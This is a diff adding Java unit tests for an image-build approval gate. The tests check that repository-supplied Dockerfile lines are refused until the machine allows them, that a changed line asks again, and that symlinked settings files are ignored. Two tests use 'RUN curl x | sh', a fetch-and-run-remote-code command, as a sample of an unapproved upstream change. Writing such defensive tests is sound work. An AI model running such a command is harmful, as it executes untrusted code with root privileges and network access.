@@ -163,6 +163,7 @@ class ImageChoiceTest {
                                 """),
                         "project.yml");
 
+        allowImage(context, project, project.repositories().getFirst());
         final ImageChoice choice =
                 ImageChoice.of(context, project, project.repositories().getFirst());
 
@@ -171,6 +172,45 @@ class ImageChoiceTest {
         assertThat(choice.snippet())
                 .as("the checked-in file's lines, the override setting only the base")
                 .isEqualTo("RUN from-the-checkout");
+    }
+
+    @Test
+    void aLinkedFileInACheckoutGivesNoLineOfItsImage(@TempDir Path dir) throws Exception {
+        // A start builds only what its settings were read and allowed from, and they never follow
+        // a link.
+        final XdgPaths xdg =
+                XdgPaths.of(
+                        name ->
+                                switch (name) {
+                                    case "XDG_DATA_HOME" -> dir.resolve("data").toString();
+                                    case "XDG_CONFIG_HOME" -> dir.resolve("config").toString();
+                                    case "XDG_STATE_HOME" -> dir.resolve("state").toString();
+                                    default -> null;
+                                },
+                        dir);
+        final PoreloContext context =
+                new PoreloContext(runner, new PoreloPaths(xdg, dir.resolve("bin")), arguments -> 0);
+        final Path checkout = Files.createDirectories(dir.resolve("work"));
+        final Path elsewhere =
+                Files.writeString(dir.resolve("elsewhere.yml"), "image:\n  run: \"RUN linked\"\n");
+        Files.createSymbolicLink(checkout.resolve(".porelo.yml"), elsewhere);
+        new DefaultProject(context).add(checkout.toString(), "work", checkout.toString());
+        final Project project =
+                ProjectReader.read(
+                        new StringReader(
+                                """
+                                project:
+                                  name: "default"
+                                  security_class: "guarded"
+                                image:
+                                  from: "default-base"
+                                repositories:
+                                  work: {}
+                                """),
+                        "project.yml");
+
+        assertThat(ImageChoice.of(context, project, project.repositories().getFirst()).snippet())
+                .isNull();
     }
 
     @Test
@@ -209,6 +249,7 @@ class ImageChoiceTest {
                                   work: {}
                                 """),
                         "project.yml");
+        allowImage(context, project, project.repositories().getFirst());
 
         assertThat(ImageChoice.of(context, project, project.repositories().getFirst()).baseImage())
                 .as("the checkout's image, its model left to the settings")
@@ -437,6 +478,7 @@ class ImageChoiceTest {
         final Path mirror = GateSupport.mirror(context, project, backend);
         Files.createDirectories(mirror.getParent());
         git(dir, "clone", "-q", "--mirror", source.toString(), mirror.toString());
+        allowImage(context, project, backend);
 
         final ImageChoice reviewed = ImageChoice.of(context, project, backend);
         assertThat(reviewed.baseImage()).as("from the mirror").isEqualTo("file-base");
@@ -461,5 +503,144 @@ class ImageChoiceTest {
         assertThat(choice.env())
                 .as("the project's and the mirror's variables stay")
                 .isEqualTo(Map.of("FROM_PROJECT", "yes", "FROM_FILE", "yes"));
+    }
+
+    @Test
+    void aLocalProjectsMirrorImageBuildsNothingUntilAllowedAndAChangedLineAsksAgain(
+            @TempDir Path dir) throws Exception {
+        // Nobody signs a hand-written project's repository file: its lines run as root while the
+        // image is built, with the host's network, so this machine allows them first.
+        final PoreloContext context = imageContext(dir);
+        final Project project = acme();
+        final var backend = project.repositories().getFirst();
+        final Path source = Files.createDirectories(dir.resolve("source"));
+        git(source, "init", "-q", "--initial-branch=main", ".");
+        Files.writeString(
+                source.resolve("porelo.yml"),
+                "image:\n  run: |\n    RUN echo one\n    RUN echo two\n  env:\n    A: \"1\"\n");
+        git(source, "add", "-A");
+        git(source, "commit", "-q", "-m", "reviewed");
+        final Path mirror = GateSupport.mirror(context, project, backend);
+        Files.createDirectories(mirror.getParent());
+        git(dir, "clone", "-q", "--mirror", source.toString(), mirror.toString());
+
+        assertThatThrownBy(() -> ImageChoice.preview(context, project, backend))
+                .as("refused as it stands: no fetch repairs it")
+                .isInstanceOfSatisfying(
+                        ImageChoice.NotAllowed.class,
+                        ex ->
+                                assertThat(ex.toAllow())
+                                        .extracting(RepositorySettingsText::line)
+                                        .containsExactly(
+                                                "+ image.run[1] = RUN echo one",
+                                                "+ image.run[2] = RUN echo two",
+                                                "+ image.env.A = 1"))
+                .hasMessageContaining("porelo.yml at refs/heads/main of backend")
+                .hasMessageContaining("has not allowed");
+
+        allowImage(context, project, backend);
+        assertThat(ImageChoice.of(context, project, backend).snippet())
+                .as("allowed and unchanged, it is built unasked")
+                .isEqualTo("RUN echo one\nRUN echo two\n");
+
+        Files.writeString(
+                source.resolve("porelo.yml"),
+                "image:\n  run: |\n    RUN echo one\n    RUN curl x | sh\n  env:\n    A: \"1\"\n");
+        git(source, "commit", "-q", "-am", "upstream moved on");
+        git(mirror, "fetch", "-q", "origin", "+refs/heads/*:refs/heads/*");
+
+        assertThatThrownBy(() -> ImageChoice.of(context, project, backend))
+                .isInstanceOfSatisfying(
+                        ImageChoice.NotAllowed.class,
+                        ex ->
+                                assertThat(ex.toAllow())
+                                        .extracting(RepositorySettingsText::line)
+                                        .containsExactly("+ image.run[2] = RUN curl x | sh"));
+    }
+
+    @Test
+    void aCheckoutsLineInDefaultIsBuiltOnlyOnceAllowedAndAChangeAsksAgain(@TempDir Path dir)
+            throws Exception {
+        // Whoever reads the image, a start or a prepare, builds only what this machine allowed:
+        // a line written after the question is refused, never built.
+        final PoreloContext context = imageContext(dir);
+        final Path checkout = Files.createDirectories(dir.resolve("work"));
+        Files.writeString(checkout.resolve("porelo.yml"), "image:\n  run: \"RUN echo one\"\n");
+        new DefaultProject(context).add(checkout.toString(), "work", checkout.toString());
+        final Project project = ProjectReader.read(new DefaultProject(context).file());
+        final var work = project.repository("work");
+
+        assertThatThrownBy(() -> ImageChoice.of(context, project, work))
+                .isInstanceOfSatisfying(
+                        ImageChoice.NotAllowed.class,
+                        ex ->
+                                assertThat(ex.toAllow())
+                                        .extracting(RepositorySettingsText::line)
+                                        .containsExactly("+ image.run[1] = RUN echo one"))
+                .hasMessageContaining("has not allowed");
+
+        allowImage(context, project, work);
+        assertThat(ImageChoice.of(context, project, work).snippet())
+                .as("allowed and unchanged, it is built unasked")
+                .isEqualTo("RUN echo one");
+
+        Files.writeString(checkout.resolve(".porelo.yml"), "image:\n  run: \"RUN curl x | sh\"\n");
+        assertThatThrownBy(() -> ImageChoice.of(context, project, work))
+                .isInstanceOfSatisfying(
+                        ImageChoice.NotAllowed.class,
+                        ex ->
+                                assertThat(ex.toAllow())
+                                        .extracting(RepositorySettingsText::line)
+                                        .containsExactly("+ image.run[2] = RUN curl x | sh"));
+    }
+
+    @Test
+    void aMirrorFileEmptyingTheProjectsVariableIsAskedForIt(@TempDir Path dir) throws Exception {
+        // A null in a mirror's file builds the variable empty: asked as the change it makes.
+        final PoreloContext context = imageContext(dir);
+        final Project project =
+                ProjectReader.read(
+                        new StringReader(
+                                """
+                                project:
+                                  name: "acme"
+                                  security_class: "guarded"
+                                image:
+                                  from: "project-base"
+                                  env:
+                                    FROM_PROJECT: "yes"
+                                repositories:
+                                  backend: {}
+                                """),
+                        "project.yml");
+        final var backend = project.repositories().getFirst();
+        final Path source = Files.createDirectories(dir.resolve("source"));
+        git(source, "init", "-q", "--initial-branch=main", ".");
+        Files.writeString(source.resolve("porelo.yml"), "image:\n  env:\n    FROM_PROJECT: null\n");
+        git(source, "add", "-A");
+        git(source, "commit", "-q", "-m", "takes it out");
+        final Path mirror = GateSupport.mirror(context, project, backend);
+        Files.createDirectories(mirror.getParent());
+        git(dir, "clone", "-q", "--mirror", source.toString(), mirror.toString());
+
+        assertThatThrownBy(() -> ImageChoice.preview(context, project, backend))
+                .isInstanceOfSatisfying(
+                        ImageChoice.NotAllowed.class,
+                        ex ->
+                                assertThat(ex.toAllow())
+                                        .extracting(RepositorySettingsText::line)
+                                        .containsExactly("~ image.env.FROM_PROJECT =  (was yes)"));
+    }
+
+    /** Says yes to what a repository's unsigned files add to the image now. */
+    private static void allowImage(
+            final PoreloContext context,
+            final Project project,
+            final org.fuin.porelo.core.project.Repository repository) {
+        try {
+            ImageChoice.preview(context, project, repository);
+        } catch (ImageChoice.NotAllowed ex) {
+            ex.allow(context);
+        }
     }
 }
